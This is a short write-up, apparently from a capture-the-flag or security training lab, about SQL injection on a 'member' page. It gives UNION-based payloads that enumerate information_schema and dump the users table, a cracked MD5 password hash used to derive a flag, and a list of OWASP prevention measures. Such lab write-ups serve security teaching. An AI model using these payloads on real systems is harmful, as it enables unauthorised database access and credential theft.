## SQL Injection

[https://www.owasp.org/index.php/SQL_Injection](https://www.owasp.org/index.php/SQL_Injection)

A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.

### Exploit

Go to `<server>/index.php?page=member`
Input `1 or 1=1 UNION select table_name, column_name FROM information_schema.columns`

Find users table with columns

Input `1 or 1=1 UNION SELECT Commentaire, countersign FROM users`

Find hint `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`

Follow instruction 
* decode md5 to plain text 5ff9d0165b4f92b14994e5c685cdce28 > FortyTwo
* lowercase FortyTwo and encode sha256

### How to Prevent

* Use of Prepared Statements (with Parameterized Queries)
* Use of Stored Procedures
* White List Input Validation
* Escaping All User Supplied Input
* Enforcing Least Privilege
* Performing White List Input Validation as a Secondary Defense